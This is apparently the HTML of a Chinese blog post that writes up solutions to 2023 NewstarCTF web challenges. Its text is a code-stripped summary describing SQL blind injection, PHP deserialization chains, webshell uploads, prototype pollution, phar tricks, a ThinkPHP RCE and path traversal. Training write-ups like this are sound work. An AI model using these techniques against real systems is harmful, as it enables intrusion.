<!DOCTYPE html><html lang="zh-CNs" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>2023-NewstarCTF-wp | VV</title><meta name="keywords" content="wp"><meta name="author" content="VVkladg0r"><meta name="copyright" content="VVkladg0r"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="2023-NewstarCTF-wp"><meta name="application-name" content="2023-NewstarCTF-wp"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="2023-NewstarCTF-wp"><meta property="og:url" content="http://cszvvds.cc/2024/05/13/2023-NewstarCTF-wp/index.html"><meta property="og:site_name" content="VV"><meta property="og:description" content="NEW STAR    WEBweek 2游戏高手 很明显不可能直接手打100000分 第一次碰到游戏题完全不会做 想了一会 直接give up 查看wp 复现如下： 前端题  改javascript代码  f12后在样式编辑器中可以找到js文件 发现游戏结束代码 346 这段代码的意思是：当分数高"><meta property="og:locale" content="zh-CNs"><meta property="og:image" content="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg"><meta property="article:author" content="VVkladg0r"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg"><meta name="description" content="NEW STAR    WEBweek 2游戏高手 很明显不可能直接手打100000分 第一次碰到游戏题完全不会做 想了一会 直接give up 查看wp 复现如下： 前端题  改javascript代码  f12后在样式编辑器中可以找到js文件 发现游戏结束代码 346 这段代码的意思是：当分数高"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="http://cszvvds.cc/2024/05/13/2023-NewstarCTF-wp/"><link rel="preconnect" href="//cdn.cbd.int"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  linkPageTop: undefined,
  peoplecanvas: {"enable":true,"img":"https://upload-bbs.miyoushe.com/upload/2023/09/03/125766904/ee23df8517f3c3e3efc4145658269c06_5714860933110284659.png"},
  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
  diytitle: {"enable":true,"leaveTitle":"VV:QAQ","backTitle":"VV!"},
  LA51: undefined,
  greetingBox: undefined,
  twikooEnvId: '',
  commentBarrageConfig:undefined,
  root: '/',
  preloader: {"source":3},
  friends_vue_info: undefined,
  navMusic: false,
  mainTone: undefined,
  authorStatus: {"skills":null},
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":true,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    simplehomepage: true,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: VVkladg0r","link":"链接: ","source":"来源: VV","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
  lightbox: 'fancybox',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false,
  shortcutKey: undefined,
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  configTitle: 'VV',
  title: '2023-NewstarCTF-wp',
  postAI: '',
  pageFillDescription: 'NEW STAR    WEB, week 2, 游戏高手, include 0。0, ez_sql, Unserialize？, Upload again!, R!!C!!E!!, week3, Include 🍐, medium_sql, POP Gadget, R!!!C!!!E!!!, GenShin, OtenkiGirl, week4, 逃, More Fast, midsql, flask disk, InjectMe, PharOne, OtenkiBoy, week5, Unserialize Again, Final, Ye’s Pickle, pppython?, 4-复盘, NextDrive游戏高手很明显不可能直接手打分第一次碰到游戏题完全不会做想了一会直接查看复现如下前端题改代码后在样式编辑器中可以找到文件发现游戏结束代码这段代码的意思是当分数高于时向发送请求弹窗你的分数并返回一个消息所以我们需要改的变量值将赋值大于方法在我们需要修改的变量赋值语句之后下断点点击语句左侧的序号就能下断点之后刷新页面重新载入页面换到控制台标签页设置要修改的变量的值达到覆盖原值的目的语句格式变量名值上传后发现分数已经超了自杀后切回调试器标签页变量值已被修改出禁用了与过滤器将和删掉替换成就是了这是库的一个函数用于字符编码转换这指定了要执行的转换在这里它试图将编码转换为编码并不是一个有效的或广泛使用的字符编码将数据从编码转换为编码这种转换通常不是攻击者的真正目的而是利用这个过滤器来造成解析文件内容时的混乱从而泄露文件内容实际上这个转换过程可能会导致输出文件内容的编码或其他形式的编码而不是直接输出转换后的字符同理这是一个字符编码转换过滤器尝试将文件内容从编码转换为编码然后再转换回编码这样的转换通常不是为了实际的编码转换而是为了造成解析文件时的混乱从而尝试获取文件内容其他可能转换为大写转换为小写随便点开一个发现上有的传参可能有注入点另一个不一样应该是从这里来注入查一下回显应该是有大小写绕一下可以了最开始的查表懵了无回显看了一下感觉没什么问题啊看来下为什么要加这个不太明白以前做的题没遇见过啊懵了说这个是不必要的但是没有这个有查不出来服了先放在这里吧之后解决了在回来补上加上后又懵了这应该大小写问题但我是每个单词都改了大小写的一个一个对发现是的问题只有和可以这是什么逻辑双标狗查字段名经典不想管了查值也可以但是我没做起报了个什么错没搞懂别人的结果简单使用检测注入点查看所有数据库查看当前使用的数据库查看数据表查看字段查看数据等上的注入方法找到注入点后抓包在注入点后加把整个包复制下来保存用来打开保存后的包很多反序列化的知识已经忘了过年的时候把笔记补上这是在对象被销毁时自动调用对象生命周期结束当一个对象的生命周期结束时例如脚本执行结束或对象不再被引用时的垃圾回收机制会自动销毁该对象并触发方法对象被显式销毁可以使用函数显式销毁一个对象这将触发复现如下但是序列化的时候和变量会引入不可见字符是类名属性名为属性名两个白空格就是编码后因为是序列化出来后会有属性导致无法完全复制去而且传参里也不能有空格应该用或者链接因为最后使用传参可以识别编码所以把空格处替换为直接查根目录中查询根目录下文件的命令为在上面的代码中将改为发现文件禁用了还可以用直接序列化也可以再编码这样就可以不加但是直接这样也不行要把命令中的加号替换为或者空格即其他的同理即可真挺讨厌文件上传的可以帮我们实现包括文件夹密码保护用户自动重定向自定义错误页面改变你的文件扩展名封禁特定地址的用户只允许特定地址的用户禁止目录列表以及使用其他文件作为文件等一些功能总之就是告诉服务器将后缀的文件解析为脚本将用解析常见配置将该目录及子目录的所有文件均映射为文件类型使用处理器来解析所匹配到的文件将特定扩展名文件映射为文件类型先传配置文件可以再传图片马我传个没马的也给我过滤了懵了换了张图片也是这样这个应该是传了后再传图片马然后蚁剑连接根目录上找找了就是这样本来文件上传和蚁剑就是我的弱项你还给我整这出它过滤了只要有就会被认为是所以要用写来绕过这个上传上去了不是用的图片马而是直接改的后缀好好好终于进来了上来就是一个下马威应该要整点信息泄露泄露被禁了下来中有严格等于分号懵了确实是没见过这是一个非常典型的无参数题这里的正则表达式匹配了一个或多个非标点符号字符表示函数名后跟一个括号表示函数调用其中是递归引用它只能匹配和替换嵌套的函数调用而不能处理函数参数使用该正则表达式进行替换后每个函数调用都会被删除只剩下一个分号而最终结果强等于时才能进行下一步简而言之无参数就是不使用参数而只使用一个个函数最终达到目的无参数可能用到的函数目录操作函数返回当前工作目录函数返回指定目录中的文件和目录的数组函数返回路径中的目录部分函数改变当前的目录数组相关的操作将内部指针指向数组中的最后一个元素并输出将内部指针指向数组中的下一个元素并输出将内部指针指向数组中的上一个元素并输出将内部指针指向数组中的第一个元素并输出返回当前元素的键名和键值并将内部指针向前移动删除数组中第一个元素并返回被删除元素的值逆转数组交换数组中的键和值成功时返回交换后的数组如果失败返回从数组中随机取出一个或多个单元如果只取出一个默认为返回随机单元的键名否则就返回包含随机键名的数组完成后就可以根据随机的键获取数组的随机值和配合使用可随机返回当前目录下的文件名读文件对文件进行语法高亮显示输出一个文件对文件进行语法高亮显示把整个文件读入一个字符串中可用于读取非格式的文件关键函数获取环境变量的值以下返回以上正常回显获取所有请求标头是的别名函数但是该函数只能在环境下使用以上返回由所有已定义变量所组成的数组会返回全局变量的值返回数组顺序为返回数组中的当前单元初始指向插入到数组中的第一个单元也就是会返回变量的数组值利用全局变量进函数返回数组中的当前元素的值该函数是函数的别名启动新会话或者重用现有会话成功开始会话返回反之返回返回参数给获取设置当前会话返回当前会话如果当前没有会话则返回空字符串文件读取太复杂了没咋看懂遇到题再来练吧法用和法用和还必须要用直接也可以还有协议可以用这是啥啊所以呢虽然我感觉在哪里见过这个结合题目应该要用文件直接构造把写入了懵了试下终于好了你猜是为什么会这样明明我传到没问题但是没实现命令直接中传参会把这些字符自动编码就成功不了所以用抓包再改回来这个特别重要我就是这里改少了导致后边做不了它会把改为要改回来然后就行了和上次那个很像还是跑不出来显示无参数可注入盲注脚本暂停秒降低爬取速度首先导入了库该库用于发送请求并获取响应然后定义了一个变量用于存储要爬取的网页地址接下来初始化了一个空字符串和一个计数器进入一个无限循环在每次迭代中计数器递增表示尝试获取下一个字符设置一个范围和分别代表可能的码值的范围这里设置为到使用二分查找算法在范围内找到中间值构造一个字符串其中包含当前计数器的值和中间码值发送请求到目标并将附加到后将响应保存在变量中检查响应文本中是否包含关键字如果存在则将搜索范围缩小为否则将搜索范围缩小为如果找到了目标字符即不等于将其添加到结果字符串中如果未找到目标字符跳出无限循环打印结果字符串为了降低爬取速度添加了暂停秒的语句在的基础上多过滤了是布尔盲注两个脚本都可以链这里把当函数调用实际触发了里面的方法实例化后给这里的赋值调用了里的方法为赋值类没有定义方法因此在调用这个方法时会触发里的魔术方法在这个方法中我们试图用删除里面的属性需要注意的是一些类中有保护或私有属性的成员因此需要对序列化数据进行编码需要特别注意的是在执行时会尝试调用对象的魔术方法该方法将使用属性的值作为可调用函数并将属性的值作为参数来执行因此在类中调用将实际上执行相当于执行即执行系统命令整体来说是中由于包含一个对象会触发魔术方法在方法中首先调用属性指向的对象即对象接下来进入类由于该类含有一个魔术方法因此在调用对象时会触发方法在方法中又会调用方法并进入类中由于类没有定义方法因此在调用这个方法时会触发魔术方法在方法中将会调用方法并触发类中的方法在类的方法中我们会调用从而触发类的魔术方法在方法中我们构造了一个命令行字符串然后通过执行漏洞执行了系统命令得到其实我觉得我应该重学一下反序列化漏洞忘得太多了太不熟练了过年那周重学一下吧命令用于从标准输入读取数据并将其写入一个或多个文件的作用是把查询到的根目录写入到当前网页下的某文件再次访问该文件即可得到被打印的根目录通常后面会跟着要写入的文件名是一个命令用于记录终端会话当你运行命令时它会开始记录你在终端中的所有活动直到你停止它是命令的一个选项表示将输出追加到一个文件中而不是覆盖它如果文件不存在它会被创建如果文件已经存在新的输出会被追加到文件的末尾是一个通用术语指的是用户与操作系统内核之间的交互界面它是一个命令解释器允许用户通过键盘输入命令来与操作系统进行交互提供了一种执行命令控制进程文件操作等的途径可以是交互式的也可以是脚本式的是一种是的缩写它是的增强版本在功能上扩展了同时兼容标准支持命令行编辑命令历史条件测试循环结构等高级特性使得脚本编写更加方便简单来说是一个广义的概念是的一种具体实现所以用的方法进行查看也可以用跟作用是一样的调用两次结果访问文件访问发现所在文件直接调用两次结果再查看文件或官方说这考点本来应该是盲注没太看懂盲注是一种针对的注入攻击攻击者尝试利用的某些特性来执行恶意命令或获取敏感信息在中用户输入的命令会被解析和执行攻击者可能会尝试利用的输入验证不严格命令替换等特性注入恶意代码导致意外的行为或泄露敏感信息这道题脚本码表其他盲注脚本其实对盲注还是不太明白解释盲注截取比较参考截取第几位从字符串左边开始计数为要截取的字符串是起始位置从左边开始从开始计数是要截取的长度省略的话表示直到字符串的末尾从右边开始计数同从左边开始计数相比这种格式仅仅多了这是固定的写法专门用来标识从字符串右边开始计数注意点从左边开始计数时起始数字是从右边开始计数时起始数字是不管从哪边计数截取方向都是从左到右延时只找到这一篇解释懵逼在网络中发现奇怪的地方发现可能是个文件查一下让我们传一个传回显可能是传回显是查看看看没有那考点应该不是爆破查看一下子类找模块找到不能使用函数所以发现之后也是一样的改为然后对它进行编码也可以用是一个在框架中用于处理消息的函数消息是一种在用户进行表单提交后显示的临时消息通常用于通知用户关于表单提交的结果例如如果你有一个表单用户提交后你可能想要显示一个消息告诉他们表单已成功提交或出现了一些错误消息就是用来实现这个目的的原型链污染还有这个网站的源码有回显抓包发现多了一个时间戳时间戳通常表示某一时刻或事件发生的确切时间这个时间通常以某种固定的格式被记录下来以便于后续的处理比较或排序一共发了五个包其中向发了时间戳进一步尝试发现不管发什么都会向发时间戳所以看看源码到底是干什么的先看看基础的分析这段代码是一个基于和框架的服务器应用程序下面是这段代码的详细解释环境变量设置通过获取环境变量如果不存在则默认为判断当前环境是否为开发环境并设置到全局变量中函数用于只在开发环境中执行特定操作配置加载加载配置文件和默认配置文件如果中没有指定则使用中的导入模块和初始化应用导入路径处理模块框架以及的解析中间件初始化一个新的应用实例中间件设置使用中间件为静态资源提供服务静态资源目录为在开发环境中加载并执行中定义的所有中间件使用中间件解析请求体如果请求体是无效的则将请求体设置为空对象路由加载加载并执行和中定义的路由启动服务器监听指定的端口并在控制台输出服务器运行状态导出应用实例将应用实例导出以便在其他模块中使用这个应用程序的主要功能是提供一个服务器用于处理客户端的请求并根据请求的和方法调用相应的路由处理函数同时它还提供了静态资源服务可以直接访问存放在目录中的文件在开发环境中它还支持通过配置的中间件进行额外的处理例如代理请求到另一个服务器这段代码定义了一些变量主要是引用了和的路由并且这两个路由都在这个文件夹下先看主要看这个函数它接收了这段代码是一个异步函数它接受一个参数并从数据库中查询特定时间戳之后的所有信息下面是这段代码的逐行解释定义一个异步函数它接受一个参数如果传入的是数字则保持不变否则使用当前时间戳这是一个注释表示要删除电影发布前的测试数据从配置中获取最小公开时间默认为并将其转换为时间戳将传入的与最小时间戳进行比较取两者中的较大值这样做是为了确保查询的起始时间不会早于配置中指定的最小公开时间使用关键字等待异步查询完成并捕获可能的错误这个查询从表中选取所有在给定时间戳之后的时间记录返回查询到的数据根据这段代码我们可以知道一定所以是怎么定义的呢是根据和来定义的所以我们要到和中去看这是怎么个事看看是啥源代码查看根目录下的和后发现并没有配置因此的第行只是采用了考虑原型链污染污染为我们想要的日期就能绕过最早时间限制获取任意时间的数据所以查看提交函数在这个文件夹下发现函数其实找找能够控制数组对象的键名的操作即可存在赋值操作即存在原型链污染因为默认时间是所以我们只需要改成比这个小的时间即可绕过限制注入的值即可提交信息必须为格式和字段是必须的再请求最后回显后找到海胆顔大覇星祭私負彼連出彼携帯店連行太超晴日必要彼完全太抽選番号终于完了真的难其实对这个原型链污染还是有点半懵半懵的主要是在这些代码是怎么串起来的为什么向的传参后就会给到里并造成污染代码审计啊代码审计思路是清楚了原型链污染是个怎么个事也是知道了就是下次做题的时候不一定做的对逃反序列化字符串逃逸替换为字符增加一位序列化代码构造结果需要逃逸的就是然后为了更好的闭合我一般都会加上这个符号也就是需要逃逸总共个字符这样我们只需要写个就行了所以链所以结果上传仍报错这是因为代码里面扔了个异常这会导致在反序列化之后直接经过异常报错导致后边的析构函数无法触发所以需要修改序列化数字元素个数改成去掉序列化尾部改成随便传一下在中发现应该是注入点被过滤没过滤没过滤也没有说明过滤了空格没问题无回显用代替空格使用时间盲注来脚本脚本注意要把脚本中的空格改成会被替换为获取数据库列表根据数据库获取表名获取表的字段最后取数据第二个脚本报错未解析的引用懵了有这个类啊找到问题了是格式错了又说我未使用的语句还有先这样吧可以上传个什么东西可以上传码要输入码说明开启了模式开启了模式下源文件被修改后会立刻加载所以只需要上传一个能的文件把原来的覆盖就可以了所以上传这个直接命令执行没回显懵了试了不行什么鬼文件名字问题要把原来的覆盖要名字一样发现图片可以点击中有源码将替代为空且在路由下猜到运行文件以及后面审计源码拿到源码竟然给你找到了我的后门你一定是网络安全大赛冠军吧那么现在轮到你了最后祝您玩得愉快明显重点在函数上拿到这里又需要让的值可控伪造无疑了然后禁用了一大堆函数肯定是要打了所以用解密需要解密的值加密需要加密的值吐了伪造后的初始界面有个文件上传功能提示访问一眼反序列化题目对进行了过滤可以使用等压缩进行绕过直接上传文件在触发反序列化拿到整个题理解还是差不多但是对反序列化还是存在一些问题也是原型链污染是中的升级版依旧是两个主要的文件但这次的函数没有那么简单能够利用了文件和文件中都有中仍有明显与函数有关可以看到函数能够接受两个参数如果没有传入参数那么直接返回没有可操作的地方因此在函数中如果函数的返回值没问题那么全剧终利用不了一点但是如果有问题的话就会调用中的代码此时是会传入一个参数的因此第一个目标就是要让函数的返回值出错继续往下看因为我们传入的参数中没有属性因此下面代码很明显是可以原型链污染控制的值的而对于由于中本身不含可直接触发该原型链大致意思是将传入的时间先分开成时分秒毫秒时分秒毫秒当传入的时间中没有毫秒最后返回的对象也不会有属性在后面注释的部分有这样的代码因此如果函数返回的对象不存在属性就能触发原型链污染首先考虑如何让函数的返回值无效观察函数的代码我们发现能够返回的地方有两个一个实在模式下一个是在模式下先执行先看从上面代码可以看出想要返回无效值是不可能的因此我们需要想办法绕过根据可知此处只需要污染即可绕过同时函数中还有一段较为关键的代码表示支持标识符当年份小于时我们认为是世纪的年份举例来说如果为在解析字符串时将解析为输出输出为最终输出的年份是这一点可以帮助我们获取很早时间的数据触发的条件是前面的返回一个无效的日期或者本身被调用时法神错误目标触发错误或使返回无效日期最后再看模式当为时直接返回结合上文我们可以污染为无效的字符使最后的返回时间无效执行最开头中的内容此时取得是也就是结合之前讲的标识符我们只需要污染为就能将返回时间改成也就是说污染为无效日期即可绕过模式进入的中用的是中的为不带有毫秒刚好能够触发的原型链污染为指定为无效值即可到此为止使用如下的可以触发进入后达到了污染的条件但是的参数变成了中的为因此可以构造为然后基于的日期匹配会返回的日期已经将提早了近一个世纪了因此最终的为污染和来绕过模式污染模板使他可以以模式匹配所以以的用方法向路径请求即可然后再请求找到含有的一条数据真的难做吐了发现提示找到源码多吃雪梨多吃雪梨反序列化测当前页面在下把的内容写进中文件的路径和名称我们都可控只要大胆猜测当前页面在下即可做题的经验将后传入即可预期解再来讲预期解能传入文件有反序列化又有函数一看就是反序列化了反序列化很简单只要绕过函数即可查看版本为只要让真实属性值不匹配即可生成时后缀名必须为设置将自定义的存入添加要压缩的文件签名自动计算将生成的文件打开将改成大于的值因为我们修改了的值因此该文件的签名与修改后的文件不匹配我们需要用脚本更新签名文件的路径获取需要签名的数据更换属性值绕过获取最后位标识和签名类型数据签名类型写入到新的文件更改文件后缀改完后上传文件利用协议访问即可好难考虑版本的漏洞让它报错看下版本然后直接上网搜该版本存在的漏洞是一款运用极广的开发框架其以前的版本中获取的方法中没有正确处理方法名导致攻击者可以调用类任意方法并构造利用链从而导致远程代码执行漏洞访问靶机地址端口号进入首页抓包变更请求为传入参数其中为系统执行命令可进行一系列操作首先抓包进行传参这个参数是可以进行修改的回显了发现命令执行参数全被上传一句话木马然后蚁剑连接后发现根目录下存在文件但是里面内容没有可能是没权限进入终端看一下最高权限才能读查看具有权限的命令没有回显但是可以读取别人的反序列化和加密的的有别人的脚本有文件但是权限不够还有一个用协议去读取一下的内容把它整理一下是一个开了的监听在端口计算值验证默认值默认值报错得到进制转进制由三个合并就后两个结果所以但是需要对和空格进行编码复盘根据前面的题可以拿到源码其中关键代码如下存在很明显的文件包含漏洞与类似包含即可写入后就是一个提权命令有权限提示随便注册一个账号把公共资源区的文件都下下来看看发现这个文件中有蹊跷十明十明十明十明信息安全技术信息安全事件分类分级指南信息安全技术信息安全事件分类分级指南不限速就是快不限速就是快这个文件叫与不同可能有信息泄露发现在我的资源区可以上传文件先随便上传一个文件抓包看看一共抓到两个包后一个就是上传文件的请求前一个包中应该进行了检测可以看到我们请求的数据只有值和文件名应该就是根据文件名和值来检测的前文我们已经有了的值直接改包上传即可这时候就能看到资源区出现了打开可以看到应该是一个分享文件的请求发现其中的和我们的不一样猜测应该是对应的将和修改成上面的内容发现我们的账号变成了自己的资源区中有个文件下载下来看看发现漏洞请进行修改参数校验是否为共享的文件系统中是否存储有该文件文件名处理发送后的内容为的值其中前位作为请求中的参数的值作为的值用于后续验证文件是否可共享是否存在于系统在通过两个检测后就会发给客服端其中对于文件名基本没有过滤我们通过穿越目录访问环境变量即可下的环境变量位于最后的然后看文件即可结束了终于写完了这要写吐了好难好难好难接下来就是先把和反序列化的课看完然后再补补',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-05-15 10:50:18',
  postMainColor: '',
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
        }
      }
      const t = saveToLocal.get('theme')
    
          const now = new Date()
          const hour = now.getHours()
          const isNight = hour <= 5 || hour >= 5
          if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
          else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.2.0"></head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://npm.elemecdn.com/anzhiyu-blog-static@1.0.4/img/avatar.jpg"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
  endLoading: () => {
    document.getElementById('loading-box').classList.add("loaded");
  },
  initLoading: () => {
    document.getElementById('loading-box').classList.remove("loaded")
  }
}
window.addEventListener('load',()=> { preloader.endLoading() })
setTimeout(function(){preloader.endLoading();},10000)

if (true) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><div class="back-home-button"><i class="anzhiyufont anzhiyu-icon-grip-vertical"></i><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" href="https://cszvvds.cc" title="博客"><img class="back-menu-item-icon" src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://image.anheyu.com/" title="安知鱼图床"><img class="back-menu-item-icon" src="https://image.anheyu.com/favicon.ico" alt="安知鱼图床"/><span class="back-menu-item-text">安知鱼图床</span></a></div></div></div></div><a id="site-name" href="/" accesskey="h"><div class="title">VV</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 文章总览</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 全部分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 全部标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/comments/"><i class="anzhiyufont anzhiyu-icon-envelope faa-tada" style="font-size: 0.9em;"></i><span> 留言面板</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><div class="nav-button" id="search-button"><a class="site-page social-icon search" href="javascript:void(0);" title="搜索🔍" accesskey="s"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span> 搜索</span></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://bu.dusays.com/2024/05/13/6640eacb0aad7.png" target="_blank"><img class="post-qr-code-img" alt="微信" src="https://bu.dusays.com/2024/05/13/6640eacb0aad7.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://bu.dusays.com/2024/05/13/6640eacae5439.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src="https://bu.dusays.com/2024/05/13/6640eacae5439.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/java/" style="font-size: 1.05rem;">java<sup>2</sup></a><a href="/tags/java%E5%AE%89%E5%85%A8/" style="font-size: 1.05rem;">java安全<sup>1</sup></a><a href="/tags/misc/" style="font-size: 1.05rem;">misc<sup>1</sup></a><a href="/tags/web/" style="font-size: 1.05rem;">web<sup>7</sup></a><a href="/tags/wp/" 